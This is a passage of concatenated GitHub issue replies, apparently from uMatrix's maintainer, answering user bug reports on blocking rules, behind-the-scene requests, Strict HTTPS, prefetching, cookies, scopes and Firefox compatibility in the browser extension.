because this was a behind-the-scene request?\nEdit: Yes, behind-the-scene request, it's clear from the log. So the rule to fix this is:\nbehind-the-scene github.com other allow\n. - You are not explaining at all what is the \"strange bug\"\n- You provide a URL with no explanation of what is the point of the URL\n- You say \"default settings of uBlock\": is the issue with uMatrix or uBlock?\nPlease take time to fill in details: https://github.com/gorhill/uMatrix/blob/master/CONTRIBUTING.md.\n. > seems like the problem was in how uBlock dims blocked frames\nSo it's a uBlock issue, not a uMatrix one? This issue tracker is for uMatrix.\nuBlock doesn't \"dim\" blocked frames, it collapses them or leave them alone.\nFor the URL you provided, there was not a single frame blocked using default settings of uBlock, and the site seems to work very well to me.\n. Using uMatrix with same set of rules as seen in your pic, I can't reproduce the reported \"non-responsiveness\", no matter how often I refreshed the page. I am completely trusting that when you say \"default settings\", it is really default settings.\n- What other extensions do you have enabled for that test case?\n- You didn't provide the version of your uMatrix, so I am assuming your are using 0.9.0.2-dev.3.\nThe only peculiarity I see on that page is that it sends a xhr request every 10 seconds -- nothing which can cause any problem.\nCheck your logger output, see if there is something out of the ordinary in it.\n. I don't get any such errors. This has nothing to do with uMatrix, uMatrix does not change the content of pulled resources, and those errors indicate the content of some css files is broken.\n. You can use only plain list of hostnames, or hosts file-compatible lists. If you feed it anything else, results are undefined, probably all messed up internally. I need to write some code to prevent obvious non-sensical hostnames from being used.\n. In the end, garbage in-garbage out. \"Hosts files\" is clearly stated, and I expected advanced users to understand this.. Can you reproduce with 0.9.0.2-dev.4 as well?\nI could not reproduce on my side using the latest dev build.\n. > What has been changed related to this that fixes it?\n189.\n. Will assume #189 fixed this.\n. Duplicate of #198.\n. What is unexpected?\nWith Strict HTTPS enabled, I tried your URL, https://openuserjs.org/, and I saw only connections to https://.\nWith Strict HTTPS disabled, for the same URL I saw connections to http:// in there.\nWorks as expected.\n. Also please, always browser version. Could you describe in details me how you came to the conclusion that non-HTTPS connections occurred with Strict HTTPS? I see none.\n. > I get Loading mixed (insecure) display content ... on a secure page\nShow me the Firefox log showing that non-https content is actually loaded.\n. Use the browser console instead, Ctrl-Shift-J.\nThe warnings above do not show up in the browser console, neither in the Network pane of the dev console for the page. Those warning do no seem reliable, it might be Firefox detecting the mixed content before uMatrix processes them. It's blocked all fine.\nEdit: Actually your first screenshot show that mixed content is blocked: nowhere is there a matching GET http://...  for the resources reported in the Loading mixed... warnings.\n. Please, show me a screenshot of the matrix where this occurs, and a screenshot of the log entries.\nConfirmed to work all fine with Chromium 41.\n. User deleted his github account, so will never get feedback about this. The issue reported is most certainly just user confusion, uMatrix has been stable since months now, and there are no other reported issues of \"something which should be blocked which is not blocked\".\n. Missing from your issue:\n- A nice link for me to install whatever is \"downthemall\"\n- Browser version, uMatrix version\n- Exact, detailed steps for me to follow so that I can reproduce your issue -- with what should happen versus what is happening\nThe logger is your best friend, it shows what gets blocked.\n. I removed the 3rd screenshot, it contained information which I believed should not be shared.\nSo I did not try the detailed steps yet, as I believe the solution can be seen in the logger: Notice that DownThemAll tells you that it is downloading something called 211f2b...e5fda4, and in the logger there is an entry blocked which matches this information:\nhttp://filehippo.com/download/file/211f2b...e5fda4\nYou chose to block behind-the-scene network requests (matrix-filtering is disabled by default for the behind-the-scene scope), so consequence is that you will need to micro-manage things which breaks because of enabling matrix filtering for the behind-the-scene scope. In the current case, allowing other for the behind-the-scene scope will fix your issue.\n. What is there is amply sufficient: blacklisted hostnames can be collapsed.\n. Looks like you are missing the * * * allow in your ruleset, so it falls back to the built-in rule, which is to block everything. By default uMatrix ships with an explicit rule * * * block, and it seems you removed it -- thus falling back on the built-in rule, which used to be \"allow\", while it is now \"block\".\n. Add the rule * * * allow to your ruleset, as apparently you were working in allow all/block exceptionally mode.\n. If I were to create a root rule by default if none is present, it would be * * * block anyways, that's the one present in a new install of uMatrix -- this did not change. So you would end up with the same issue. Just be sure to never remove your root rule, so that it can not be overriden.\n. Can you see in the logger the sequence of events? The logger will report in the exact order the network events were received. I would need an exact scenario to reproduce -- actual URLs with which you can reproduce the issue all the time.\nI suspect this could be caused by the browser setting \"Use a prediction service to help complete searches and URLs...\".\n. @Alpengreis \nYour original bug seems to be a side effect of how the browser API works: network requests are associated with tab, not with web page, and because of this, it is possible that network requests from a previous page are seen by a new page -- and there is no way for an extension to decide to which web page a specific network request originates, it can only tell from which tab. The fact that  refreshing the page does not change the matrix content is by design in uMatrix: uMatrix will cache and reuse the data, until a few minutes after the page has not been visited. The reason for this is that if a web page make unfrequent requests to some specific 3rd-party hostnames, you still want to keep that information around a bit so that the user is properly informed about this.\n@adrienbeau \nKeep in mind this: URL redirections.\nThe way redirections are detected is different in uMatrix, I may look into this to see if I can improve to get the same results as how HTTP Switchboard behaved. In your case, clicking on a link in Google search result always results in a redirection (because Google wants to know which link you clicked).\n. > why can NoScript handle this proper? \nI can't answer as I know nothing about NoScript code. One thing is for sure though, is that NoScript does not report xmlhttprequest, which are the network requests most likely to be affected by the current issue.\n. What version of uMatrix? ~~Give me steps to reproduce please, that will save me time.~~\n- Load URL: https://plus.google.com/107545467275966756564/posts?hl=de\n- Then URL: http://www.swissvpn.net/\nOK reproduced with latest build dev.\n. From what I can see, there is a beforeunload event listener on the Google+ page, which executes after the new document started loading. As said, uMatrix is being told from which tab a network request occurs, not from which document URL.\nTo give some perspective, even the Network pane in the dev console will report network requests to google.com when loading the second site -- so the issue is not specific to uMatrix.\n. I don't know why it does not happen with uBO, it should, the logger reports google.com after the second document has started loading. I need to investigate why. NoScript does not report google.com because what is pulled are images, not scripts.\n. I explained why this happened:\n- The browser tells uBO/uMatrix from which tab a network request originates, not from which web page.\n- uMatrix works differently than uBO -- it remembers the seen hostnames across page reloads (up to a few minutes in the future), for the benefit of the user (if a 3rd-party occurs only once on a specific page load, we want the user to be informed about this, and not have the information flush down on a mere page reload).\n. What is corrupted?\n. I am going to guess you refer to the long hostname, duplicate of #182.\n. I could bring support for FF 29 and up to uMatrix, but as usual, this would require some work and at some point it's just a matter of time and if the time and work invested benefit more than just a handful of users.\n. I don't have the manpower for this. Best is for another developer to provide the work. And this will have to go in its own platform-specific code (not merged with existing Firefox vAPI), or worked out as a fork.\n. I could import @AlexVallat work into uMatrix. The current issue is that even FF 34 and less is not supported, it's less an Australis issue than a an issue of reliably associating a tab id with a network request. I did use code as suggested in FF doc, just to find out that this code does not work in pre-FF 35.\n. Fixed with 1f4ba9dda90cee7c0afb0dbbb23d537ed0425220.\n. @LimboSlam So both latest releases of uBlock Origin/uMatrix support explicitly Pale Moon (through Pale Moon's own GUID), and I have summarily tested that they both work fine on Pale Moon 26 beta. Should then these added to Pale Moon's collection of add-ons? If you think so, could you take care of this? If so, the latest stable xpi version in the release section should be used.\n. uMatrix has to evaluate network requests while the browser is waiting for an answer -- it's a blocking operation -- and this must be performed as fast as possible.  What you suggest does not fit into this. What would help is fixing #122.\n. There is a similar issue for uBlock.\nI tried using a data: URI for the Font Awsome font file but that did not work.\nUsing fonts is really a huge time savers (easy to change, CSS styling), I won't ever go back to pixel-based icons. There is an issue on Firefox side to address fonts used as set of icons, but unclear if and when this would be resolved. I am not too warm at the idea of converting all to SVG, that would add some work overhead any time I want to change/select an icon -- but maybe I won't have choice.\n. > only one has problems displaying the buttons\nFirefox version for that one? See http://www.ghacks.net/2015/07/21/firefox-41-mozilla-modifies-how-icon-fonts-are-handled-by-the-browser/.\n. Related: https://github.com/gorhill/uBlock/issues/112.\n. Meanwhile, someone here suggested a workaround:\n\nFix 1 (As a userstyle or in userChrome.css)\n```\nnav-bar {\nheight: 0;\noverflow: hidden;\nvisibility: hidden;\n\n}\nnav-bar * {\nvisibility: visible;\n\n}\n/ Blacklist the known nav-bar children /\nnav-bar-customization-target, #PanelUI-button, #window-controls, #nav-bar-overflow-buton {\ndisplay: none;\n\n}\n```\nFix 2 (Requires Pentadactly, code below goes in .pentadactylrc)\nstyle -name ublick * #nav-bar * { visibility: visible; }\n. If you click the click-to-play, is it detected?\n. > with flash on ask, the plug-in fails. with flash on always, the plug-in loads\n\nExpected. The issue here is just one of reporting -- I know why it happens. There was code to report embedded plug-ins before, and I removed this. I lean toward keeping it removed because:\n- Removing plug-in detection in content script remove an overhead which is not really needed\n- This happens only with click-to-play\n- Whether a plug-in exists on a page is reported in the address bar when click-to-play is enabled\n- If it is reported in the matrix, a user might be confused as to why the plug-in does not work if it is allowed in the matrix: because it needs to be click-to-played first.\nSummary, I believe I will keep the current behavior, it makes sense. For those who are coming to uMatrix for the first time, this won't come out as a surprise that plugins are not reported in the matrix if click-to-play is enabled.\n. Closing because issue is likely obsolete by now. I can't repro any of the cases provided (no Flash seen on the pages).. If SDC doesn't do its job, please file an issue with SDC. uMatrix merely uses Firefox APIs to do it's job -- it does nothing special to prevent other addons from working.\n. The site has a bug, it uses an invalid URL: http://forum2.nexon.net\\/[...].\nNow on Firefox, uBlock makes use of the native URI parsing, and Firefox returns a hostname which is forum2.nexon.net\\, while on Chromium there is a custom regex-based parser, where the extracted host is forum2.nexon.net. Chromium URL parser is based on the regex found in RFC 3576.\nNow which one is right/wrong between Firefox or the regex found in RFC 3576?\nIn any case, the site has a bug in its code, it's probably a very rare occurrence, and I won't make code change to uMatrix to address such an unlikely 3rd-party issue.\n. > Loading the script on google.com is required\nI tested with NoScript and the page did not go blank.\nI suspect this is caused the by uMatrix's attempt to \"revive\" the <noscript> tags on the page (necessary because CSP directives to prevent scripting do not trigger the parsing of noscript tags). I have to find out if anything has changed regarding this, this is very old code.\n. Only hostnames, not URLs.\n. There is so much uMatrix can do with Chrome's prefetch, it's why it's advised to turn that feature off. You should see the requests from prefetch in the behind-the-scene matrix though, and if you want to use pre-fetch, this is where you will have to filter these requests if you want to block them.\nPlease confirm you see them in the behind-the-scene matrix, and if so, then close the issue, there is nothing uMatrix can do, the requests which are behind-the-scene are so because it's not possible for uMatrix to associate them with a specific tab.\nBrowsers' prefetch features are incompatible with privacy minded habits anyways.\n. I am trying to reproduce. First, the setting is:\n[ ] Predict network actions to improve page load performance\nRight?\nSecond, you say you see the issue after forcing a refresh of the page? I tried this, and google was reported in the logger and blocked as expected. How did you check for those connections?\nI want precise and concise step by step on how to reproduce -- I just want to follow them without having to guess anything. Once I reproduce and I confirm that uMatrix/uBlock are not called for these pre-fetched requests, will have to document prominently for users to disable that feature..\n. > Prefetch resources to load pages more quickly\nOk, they change the wording in Chrome vs. Chromium.\nOk here is what I see using chrome://net-internals/#events, if the setting is enabled, the TCP connection is made before the details of the request is passed uMatrix/uBlock, ifthe setting is disabled, the TCP connection is made after, if and only if the request is not blocked by uMatrix/uBlock.\nLooking through the Chrome API, I see there is an API to disable that setting. So given the nature of uMatrix/uBlock, I will force this setting to be disabled.\n. @dorkbox uBlock/uMatrix's job is to block network requests, and users trust that it does what it says it does. Not disabling pre-fetching betrays that trust [1], as the reality is that most people will install and not care to RTFM. I have users' interests at heart first and foremost, including those who don't RTFM, so this will stay.\n\n[1] Just opening a TCP connection causes the remote server to become aware of one's IP address, with no data yet having been transferred. This is not compatible with a privacy-minded extension, for which it is expected the remote server of a blocked network request is completely unaware of your existence.\n. @dorkbox Done.\n. Yes I've seen this with uBlock Origin too. Not sure what is going on with Chrome's redesigned Settings page.. According to chrome://predictors/ (select \"Resource Prefetch Predictor\" tab), it is really disabled, even though it shows as enabled with uBO or uMatrix. So the issue appears to be only a rendering issue on Chrome's Settings page.. I just tried it and it worked fine installing over.\nIt's just that sometimes if seems there is a glitch somewhere in Firefox and some old stuff from the previous version is not flushed -- maybe it's a cache thing, and this causes uMatrix to not function properly. On my side I have to install often because development, so maybe it's more likely to happen to me.\n. Duplicate of #66.\n. Unable to reproduce. No details provided. Will close after one day of no details steps/observations of how to reproduce + detailed information about settings.\n. Actually, closing, this makes no sense, when uMatrix is disabled it is not even running.\n. > you have no respect for the issue I submitted?\nI have something regarding respect in CONTRIBUTING, point 5. and 6.\n\ndisabled umatrix (on the power button)\n\nOk, a bit more info. Still you do not provide any further details. What is blocked exactly? Use the logger, it's the tool to use before filing reports, and to use to file report.\n. > open the chat\n- I disabled matrix filtering\n- I opened uMatrix's logger\n- I opened https://www.tradingview.com/chat/#general\n  - Please provide a URL next time so that I do not have to guess it\n- I clicked on a chart\n  - The chart opened in another tab as a PNG image\n- At no time did the logger report anything being blocked.\n- I disable uMatrix in the browser\n- I reload the page, and could not see any difference with before\n. > what could be the reason for the charts being blocked even when uMatrix is disabled?\nStrict HTTPS could be a reason.\n. > maybe consider removing the unable to reproduce tag\nOf course not, I really wasn't able to reproduce. Since you say the issue was on the web site's side, I will close.\n. - uMatrix's logger says: no connection to Facebook.\n- Firefox network pane says: no connection to Facebook.\nSo no issue.\n. > Do you plan to publish signed versions in releases?\nI will have to read about this if this can be done, and if so, how.\n. Install from there please: https://addons.mozilla.org/en-US/firefox/addon/umatrix/versions/beta.. Thanks.\n. I was thinking about this earlier, to have them part of the set of host files available out of the box. I will have to confirm they really add value though, i.e. that most entries do not end up being duplicates of what is already in other hosts files.\n. By design. These rules are first managed by uMatrix through the popup, the primary UI - and everything which is not a valid rule will be discarded by uMatrix. The My rules panes is a secondary UI for convenience.\n. It's all in the release notes, please read them.\n. Can you look in the logger to see what gets blocked and in which context?\n. Probably related to this: Why can't I save an image using contextual menu?.\n. > Does the ability exist\nIt exists in uBlock, not in uMatrix. uMatrix's purpose is to deal with network requests, not DOM elements.\n. > would it be preferable to run one instead of the other?\nThis is best answered by you. I don't know what level of blocking control you are seeking. For most people uBlock does provide plenty of control, as it is also able to act as a default-deny firewall. uMatrix is really for those who wants to be able to also block by classes of requests, not just according to their origin.\n. > one POST request got through\nUse the logger, you will find out it's a behind-the-scene request. You can block it if you enable matrix filtering for the behind-the-scene scope, like I do:\n\n. > cookies are being set on the system\nuMatrix does not prevent cookies from entering your browser (as quoted by @5t3f4n). Blacklisted cookies however will not leave your browser. From a server's point of view, the cookies are write-only, i.e. they can't be read back.\nStripping Set-Cookie headers would prevent uMatrix to report accurately all the cookies. A single cookie header can contain a whole lot of distinct cookies at once, and parsing these in JS makes no sense when the browser does it for free, especially that there are some special cases to deal with etc. Very early that was the approach used by HTTPSB, but this was really bad.\nWhat you may want is to check the \"Delete blocked cookies\" in the dashboard.\n. > 1) If, for example, I go on a website that gives me a google.com 3rd party cookie, but it does not get deleted by uMatrix and I then go to google.com, will they be able to read that cookie?\nYes, if cookie is not blacklisted on google.com, it will not be stripped from request headers.\n\n2) If I have some legitimate google.com cookies (login or so) but on another website the google.com cookie wants to be saved as a 3rd party (tracking) cookie, and uMatrix is set up to delete blocked cookies, will uMatrix also delete my legitimate login cookie?\n\nNo. If a cookie is whitelisted anywhere, it will not be deleted. If in a specific scope a cookie is blacklisted, the outgoing cookie header will be stripped from requests made in that scope.\n. > Can you integrate this in uMatrix too?\nuMatrix is different, all the cells are interactive, including the hostname cells, which is not the case for uBlock. I don't see how I could make this work.\n. > As direct-function: \"MiddleMouseButton\"\nThe middle button idea is interesting. Only the user can copy to the clipboard though, so what the middle button could accomplish is to select the text.\n. Javascript can't access user clipboard -- that would be awful security-wise if it could.\n. Thanks.\n. I think in such case the Commit  button in the My rules pane is best suited for this. Blindly committing all temporary rules does not seem a good idea to me. Forcing users to do it from the My rules pane will allow them to revise at the same time if all the temporary rules are worth committing. Also, the space left in the matrix toolbar is very precious, I want to keep it for future buttons for which it will make sense to put in there.\n. uBlock/uMatrix use the chrome.storage.local API, and whatever the browser does behind that API is hidden from uBlock/uMatrix, and out of control of uBlock/uMatrix.\n. > This issue is not about uBlock.\nSorry I did not notice it's uMatrix here. Same answer anyways.\n. I will admit I don't understand the issue reported.\nIs this an SQLite issue? You tried to copy the SQLite file from one profile to another new one, and it didn't work?\n. Did you copy the SQLite file while uBlock was running?\n. > No filters are actually loaded (0 out of 0)\nIs it possible the file did not download because it was blocked by a behind-the-scene rule?\n. In uBlock it's an external stock list, meaning it appears in the built-in selection of filter lists, but the list itself is not in the package.\nThis kind of symptoms did occur to me in the past, and there are two possible explanations:\n- A behind-the-scene rule blocks the fetching of the list.\n  - Easily overlooked, and I got myself fooled exactly with the Disconnect filter lists when I tried them the 1st time in uMatrix.\n    Even went to investigate the code until I realized my behind-the-scene matrix was blocking the Disconnect URLs.\n- The remote server is transiently not available for whatever reasons.\n. > shouldn't it throw a warning that the filter list wasn't successfully downloaded\nYes, that would be helpful.\n. On the other hand, letting noscript tags work was causing Google Search page to be blank with Firefox (#232)...\n. Duplicate of #319.\nFixed in next release.. Your picture shows that for the page about:blank, matrix filtering is disabled. Matrix filtering is disabled by default for about:blank. Just turn it on if you  want it on.\n. The two first images are two different scopes. One for which matrix filtering is disabled (blank.about-scheme), and one for which matrix filtering is enabled (yahoo.com). Matrix filtering can be enabled/disabled on a per-scope basis. The about-scheme scope has matrix filtering disabled by default.\nI don't any issue so far.\n. >  Matrix filtering shows \"blank.about-scheme\"\nYou mean it shows blank.about-scheme while on a Yahoo page?\nIf so, then this is an issue, and I will look into it.\n. I can't reproduce what you have. I did set private browsing in about:config, restarted FF to open on the tab last opened, but it opens with no tab. I will need exact steps to reproduce, something I can follow without guessing anything.\n. As much as I tried, including the steps described here, I can't reproduce. 0.9.1.2-dev.2 is out, see if the problem is still there.\n. uBlock issue 452 is interesting with respect to the bug here. Firefox API reports a document being opened, yet when trying to find the document among existing tab objects, it can't be found: the supposedly top document is actually a child of an about:blank tab object. This matches well the symptoms here.\n. There is no concept of scope in NoScript. There would be no issue here if there was no concept of scope in uMatrix or uBlock.\n. > Unfortunately, you don't answer if it's fixable or not\nUntil I can reproduce, I won't be able to answer.\n\nmalware can principally start a malware page, because uMatrix status is \"ALL green\" \n\nEven when this is fixed, this will still be true, because there is absolutely no guarantee whatsoever that Firefox will not load a page before all extensions are ready.\n. Maybe e088e9cf709d24bc11894d6dbbdeb79493037717 fixed this, if you guys can test with 0.9.1.3-dev.4.\n. > I can allow each of these subdomains\nThese are not subdomains, they are base domains. uMatrix extract base domains as per the Public Suffix List (\"PSL\"), and the PSL says that cloudfront.net is a public suffix, not a base domain. Same for githubusercontent.com.\nSee:\n- #54\n- #121\n- #155\n- #250\nIf you want to blanket-allow cloudfront.net, you can do it be entering a rule directly in the \"My rules\" pane in the dashboard. The matrix UI limits up to base domains, not beyond.\n. For the same reason a rule such * com * allow won't override the block rule * hotjar.com * block seen in your screenshot. Read the documentation please.. You should assume they are blocked by the hosts file for a good reason. Best is to just locally remove the block rule itself for whatever [...].couldfront.net server you found is needed for the current site.. Strict HTTPS?\nI plan to soon provide the reason why a request is blocked in uMatrix, like it is in uBlock.\n. > Not sure if this is by design\nYes it is. The matrix is separate from the switches, in UI and internally as well.\n. > it would make much more sense to blacklist systems it won't run on, Android??\nYes it would make more sense. I guess I had to select \"All platforms\" in AMO, despite uMatrix not being compatible with Fennec... The Fennec GUID is not in install.rdf anyways. Not sure how this would work, I wouldn't want Android users to end up downloading something that won't work on Firefox Mobile.\n. Should no longer be an issue, I no longer mark the extension as being incompatible with Android platform.. > This will increase the efficiency and speed of loading sites because it will diminish the number of elements that needs to be inspected against some 60,000-100,000 filters of uBlock\nDo you have any benchmark to support that this is an issue?\nLast time I measured I got an average of 200 us per request for onBeforeRequest in uBlock.\nOnly sound benchmarks must drive development, otherwise it's just more than likely coding effort will be wasted working on non-issues.\n. > If uBlock is checking things that were already blocked it's using CPU power for nothing\nSo you are probably seeing this on a Chromium-based browser. With Firefox this does not happen if I am not mistaken. It's a browser issue really, not an extension issue. But even if you went to file an issue with Chromium devs, I doubt there is anything to do, because I assume it's currently done the way it is done because each extension is in its own process, and so they can all evaluate requests in parallel, and forcing them to work in sequence would mean to forfeit advantage of parallelism of per-process architecture.\n. @harshanvn \n\nSteps to Reproduce\n\nWhat is the issue?\n. Ok I guess I understand how this works in FF. If a request is blocked content-side in shouldLoad, the other extensions won't see it. If the same request is blocked in the HTTP observer instead, other extensions will also be able to see it. That's the best explanation I can find. I believe many other blockers work at shouldLoad level, while uBlock/uMatrix work at HTTP observer level.\n. In latest dev build.\n. https://github.com/gorhill/uMatrix/blob/master/CONTRIBUTING.md:\n\nOpen source quality software comes from contributors carefully crafting code: conversely, issues must also be carefully crafted.\n\nPlease, provide all details rather than send me on a quest to find out what exactly you are talking about.\n. Let me address \"Big vulenability\": it's an hyperbole.\nI did fix locally the vendor thing, but any user thinking it addresses the whole fingerprinting problem would fool himself pretty bad, because there is so much more information in there -- outside UA spoofing scope -- that can be used as fingerprinting.\nLet's stick to common sense. If fingerprinting is a major concern, blanking a few select fields in navigator object is not what works.\nFingerprinting does become a concern for when you let 3rd-party javascript run in your browser when loading web pages. The whole point of fingerprinting is 3rd-party vendors building database using your visits from many different web sites.\nSo if fingerprinting is a major concern, the most important steps are:\n- Do not allow 3rd-party javascript to run at all (out of the box settings in uMatrix).\n- Your IP address: use a proxy or VPN, or block all 3rd-party resources.\n- Clear browser cache on a regular basis (so that passive 3rd-party resources with fingerprinting payload are flushed).\n- Block XHR, to prevent whatever gathered information from being sent back to remote server(s).\nAll these steps dwarf the impact of blanking the vendor and related fields in the navigator object.\nSo to qualify the non-blanking of the vendor field as \"big vulnerability\" is hyperbole. There are many more fields in the navigator object which can be mined, and many more other stuff outside the navigator object which can be mined.\nThe best recourse is to prevent javascript from running (this would take care of the case here), and if you must execute javascript, prevent gathered information from being sent back by blocking XHR.\n. > When you open the page it will show the real user agent. And when you click on Test it will show the spoofed one\nI did not investigate but this must be due to Chromium limitation: there is no guarantee uBlock can inject its spoofing code before any inline script on the page has executed.\n. > I try what you said ; and don't work for me on whoer.extended.\nWhat did you try?\n. > It happens in Firefox 38 as well\nOk, thinking of it, the spoofing script tag is not injected immediately when the content script is executed, the content script first asks asynchronously the main process whether spoofing is enabled or not, then upon receiving the answer, it will inject the spoofing script tag if enabled.\n. @moulierac Yes of course...\nuMatrix is for advanced users, I can't help non-advanced users understand technical stuff, I would spend all my free time writing walls of text -- which I tried above for your benefits -- with no better understanding as a result. Non-advanced users who wants to understand technical stuff and how uMatrix helps them will have to seek knowledge themselves, I just do not have the time on hands.\nThe point I was trying to make here is that \"Big vulenability\" was hyperbole.\n. @moulierac \n\nI'm advanced user.\n\nAgain:\n\nI try what you said ; and don't work for me on whoer.extended.\ndo not allow 3rd-party javascript to run at all \nblock all 3rd-party resources\n\nIs whoer.net 3rd-party to whoer.net?\n. The file name is fine: http://hosts-file.net/.%5Cad_servers.txt, as seen in filter-list.json.\n. The list URL is fine, there is just no guarantee remote servers will always be up and running.\n. > in uMatrix/assets/umatrix/hosts-files.json it's ad_servers.txt so it trips the \".net/ad_\" rule in Easylist\nOk, I did not realize I was commenting in uMatrix project. Yes, that list needs to be renamed to prevent a hit on EasyList.\n. > Thoughts?\nI don't plan to implement this.\n. Block 3rd-party sites by default, i.e. work in default-deny mode. uMatrix with out-of-the-box setting protects you. since only passive 3rd-party content is allowed (css, images).\n. > cascading permissions might be a better choice when combining with uMatrix\nWhat is the advantage of NoScript's \"cascading permissions\" over adding the global rule * * script block ...\n\n... then allowing on a per-site basis all non-blacklisted scripts (1st- and 3rd-party ones) with two clicks to toggle the script cell to allow ...\n\n... ?\n. I can't reproduce with current version of uMatrix.. > Is it possible to apply a generic rule to only allow the current tab's root domain by default, but block any requests to any of it's subdomains?\nNot possible. I don't plan to support this, this is not merely an extra feature, this means completely changing uMatrix core.\n. EasyList is not a hosts file.\nIf you feed uMatrix anything else than a hosts file or a plain list of hostnames, results are undefined.\n. I can reproduce with localhost as well -- I agree this is should not happen.\n. > I would expect about:addons to result in addons.about-scheme and chrome://ublock0/content/dashboard.html to result in ublock0.chrome-scheme.\nYes, it's supposed to be like this for about:[...] pages, but for chrome://ublock0/[...] pages it links to the behind-the-scene scope because it used to be the only way to do it. This could be removed now that the behind-the-scene scope is available in the logger.\nRegarding that about:[...] scheme, it seems it's again #262, which for whatever incredibly annoying reason, I just can't reproduce on my side.\n. @quilloss Thanks for the investigation, this put me on the right track.\nThe real issue is not found in d6a48df60162a2f0b4465c4bea5b477cde06cadd, but rather in 4ab8f52b4425b115a6af8410e919df564ae0c83a: I should not have removed @AlexVallat's content-side code to deal with location changes. Even though this seems like this worked, I just found easy case to reproduce issues where the current way of dealing with URL change in the address bar does not work in uMatrix, even if I were to put back the code removed in d6a48df60162a2f0b4465c4bea5b477cde06cadd. The test is very simple:\n- Type directly about:memory in the address bar, hit return.\n- uMatrix is not aware of the location change.\n- Type directly news.ycombinator.com in the address bar.\n- uMatrix is aware of the location change.\n- Type directly about:memory in the address bar.\n- uMatrix is not aware of the location change.\nSo the real fix is to bring back the code removed in 4ab8f52b4425b115a6af8410e919df564ae0c83a. I did not realize back then that it was just not possible to reliably track location change without this code.\n. Your rule worked for me:\n\n. My bad, I thought I was answering for uBlock. uMatrix does not support dynamic URL filtering.\n. You can invoke the popup from the logger.\n. > I can invoke the popup from the logger, but the scope is set to the domain [...]\nhttps://github.com/gorhill/uMatrix/wiki/Logger#special-status-indicators:\n\nIt is possible to click on the status indicator area to open the matrix for the associated tab \n. > I don't see that option\n\nabout:extensions, scroll to the bottom, click Keyboard shortcuts.\n. https://github.com/gorhill/uMatrix/wiki/How-to-access-the-popup-panel-when-there-is-no-toolbar. Turn off user agent spoofing for that site, or use only Firefox-based user agent strings, i.e.:\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0\nMozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0\nMozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0\nMozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0\n. By the way, regarding \"completely disabled\": that button disables matrix-filtering specifically, it does not completely disable uMatrix.\n. Use the logger, it will show you the blocked requests. Bring the matrix from there to unblock whatever requests is necessary. I don't want to give my email address to that kind of site, so I will let you figure the fix. uMatrix is for advanced users, I should not need to attend this kind of problem.\n. Unable to reproduce using provided details. I see http://daemon-tools.cc/{session-cookie:PHPSESSID} reported in the logger, and one cookie reported in the matrix.\n. > ff 39 [...]\nStill unable to reproduce:\n\n. And this is what I get in the logger:\n\n. Are there error messages at the browser console (ctrl-shift-J) for when the cookies are not reported?\n. > Security Error: Content at moz-nullprincipal:{6bf6068e [...]\nThese are benign. Any other installed extensions which could interfere with cookies?\n. > happens in private browsing only\nNow I can reproduce.\n. > Don't just prevent scopes from loading, but completely remove them (aka the RequestPolicy way)\n\"Scopes\" are just a concept, uMatrix blocks network requests, not \"scopes\". uMatrix blocks network requests at HTTP observer's level, not at content policy level. This means that other extensions which work at content policy level will see all resources which go through shouldLoad.\nWorking at HTTP observer's level has many advantages: ability to handle redirects, ability to modify request/response headers, and since whole uMatrix core code is chrome process, this means no issue with CPOW overhead -- uMatrix performs excellently on e10s.\n\nIt's such a shame these 2 issues prevent me from replacing RequestPolicy and NoScript with uMatrix\n\nI do not intend to move uMatrix's blocking to content side, so you will have to keep using these. uMatrix's contributed overhead as seen in about:performance is a small fraction[1] of the overhead introduced by these other add-ons, and for me efficiency is a primary concern, not a secondary one, and for this reason I do not intend to modify uMatrix for the sake of \"who is effectively blocking what\". uMatrix's logger will tell you what uMatrix is blocking.\n[1] For example, about:performance (set at 1-sec poll) for cnn.com says user = low% (~10% max), system = 0%, cross-process = 0%. You will find 3-digit for same test with RequestPolicy and NoScript, each on their own, for user and cross-process, and single-digit for system.\n. You can go in the My rules pane in the dashboard and commit your rules from there.\nAuto-saving is not a good idea, the issue will become, \"I use auto-saving, but sometimes I forget to erase temporary rules and they end up as permanent rules\". The current way of dealing with temporary rules has been true since the early days of HTTPSB, and I do not intend to change this.\n. That's the purpose of Strict HTTPS, to prevent any non-HTTPS requests when the main document is HTTPS.\n. I don't intend to implement anything more granular than this.\n. > Is this due to the a concern with making the UI too busy?\n- doesn't fit readily in the matrix UI\n- doesn't fit readily in the current core architecture\n- feature unlikely to be useful to many users of uMatrix\n  - keeping in mind uMatrix is already appealing to a fraction of users compared to uBlock (~1%)\n- the more complex a feature, the less likely it will be used -- I rather contribute dev work where it has most impact:\nSource: guts\n. > WHAT problems did YOU have?\nTrying to debug using the Firefox built-in debugger, the debugger was seeing only the previous version, not the new one.\n. > gorhill posted them recently, regarding CPOWS\nI posted results of an informal eyeball test in this uMatrix issue, more to emphasize that I believe uMatrix (and uBlock, since roughly same vAPI code) was doing it the right way. Now if one uses NoScript or RequestPolicy, of course overall browser performance will be better because of all the bloat being blocked from web pages. But if comparing extensions, for same results, uBlock/uMatrix appear to perform better as per about:performance.\n. Personally I consider blocking by default 3rd-party frames/scripts is amply sufficient security-wise, assuming click-to-play is also enabled. Then it's a matter of allowing on a per-site basis only what is needed if something is broken.\n. It's already in there: Just check \"Delete local storage content set by blocked hostnames\". The state of the cookie cell will dictate whether localStorage is cleared or not when the setting is checked.\n. uMatrix was already compatible with FF35+, hence the compatibility has been extended to FF24-34.\n. Extensions have no control of the order they are being call by the browser. In the case of Firefox, the documentation says order of installation decides the order in which the extensions are called to do their job:\n\nThe order of content policies in the above case depends on the precedence of installation\n\nAbove is for shouldLoad, I am assuming this also applies for HTTP observers.\n. I did not test directly with Pale Moon but I tested with Firefox 25. What would be the closest FF version? I am on Linux, and I could not find any .deb package on the Pale Moon site for me to install. There was a link to Sourceforge, but for obvious reasons I won't touch anything on Sourceforge. Ideally even just a compressed package which I can just extract/execute without a formal installation is best.\nNote that the issue might not be solvable, I labelled the code to resize the popup in Firefox as \"voodoo\", because it's anything but straightforward to resize the popup in Firefox, but so far, it works fine on my side for all versions of Firefox, from 25 to 42 -- so maybe there is also something for Pale Moon to 